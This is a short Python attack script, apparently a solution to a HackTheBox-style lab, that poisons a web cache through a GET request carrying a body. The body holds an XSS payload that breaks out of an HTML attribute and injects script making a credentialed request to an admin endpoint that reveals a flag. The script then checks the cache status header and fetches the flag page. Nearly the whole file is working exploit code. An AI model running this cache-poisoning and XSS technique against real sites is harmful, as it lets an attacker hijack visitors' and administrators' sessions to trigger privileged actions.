#!/usr/bin/python3


import requests
from urllib.parse import (
    quote
)
from typing import Any
from time import sleep

def send_request(url: str, data: Any = None) -> None:
    if data is not None:
        ress = requests.get(url=url, data=data, headers={"Host":"fatget.wcp.htb"})
        print(ress.headers)
        print(ress.headers['X-Cache-Status'])
        return

    print(requests.get(url=url, headers={
        "Referer": "http://188.166.152.18:30875/index.php?language=de"
    }).text)


def main():

    send_request(url="http://188.166.152.18:30875/index.php?language=de",
                 data={"ref": "\"><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();</script>"})

    # sleep(20)
    send_request(url="http://188.166.152.18:30875/flag.php")


if __name__ == "__main__":
    main()
